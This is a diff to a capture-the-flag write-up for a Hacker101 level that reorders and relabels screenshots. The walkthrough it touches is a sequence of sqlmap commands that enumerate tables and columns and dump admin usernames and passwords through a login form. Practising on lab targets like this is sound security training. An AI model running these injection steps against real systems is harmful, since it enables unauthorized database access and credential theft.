@@ -44,32 +44,30 @@ Finally got some results! I got all the databases. I'm going to take a look into
 sqlmap -u "https://{HEX_VALUE_HERE}.ctf.hacker101.com/login" --data="username=admin&password=admin" --method=POST -D level2 --tables
 ```
 
-![sqlmap_databases](sqlmap_tables.png)
+![sqlmap_tables](sqlmap_tables.png)
 
 Let's get into the admins table and see its columns.
-
-![sqlmap_databases](sqlmap_columns.png)
 
 ```bash
 sqlmap -u "https://{HEX_VALUE_HERE}.ctf.hacker101.com/login" --data="username=admin&password=admin" --method=POST -D level2 -T admins --columns
 ```
 
-Now let's have a look at the usernames! Dump it!
+![sqlmap_columns](sqlmap_columns.png)
 
-![sqlmap_databases](sqlmap_usernames.png)
+Now let's have a look at the usernames! Dump it!
 
 ```bash
 sqlmap -u "https://{HEX_VALUE_HERE}.ctf.hacker101.com/login" --data="username=admin&password=admin" --method=POST -D level2 -T admins -C username --dump
 ```
+![sqlmap_usernames](sqlmap_usernames.png)
 
 Now let's retrieve the password.
-
-![sqlmap_databases](sqlmap_databases.png)
 
 ```bash
 sqlmap -u "https://{HEX_VALUE_HERE}.ctf.hacker101.com/login" --data="username=admin&password=admin" --method=POST -D level2 -T admins -C password --dump
 ```
-![sqlmap_databases](sqlmap_password.png)
+
+![sqlmap_password](sqlmap_password.png)
 
 Now lets try log in. Got it! We have the last flag
 
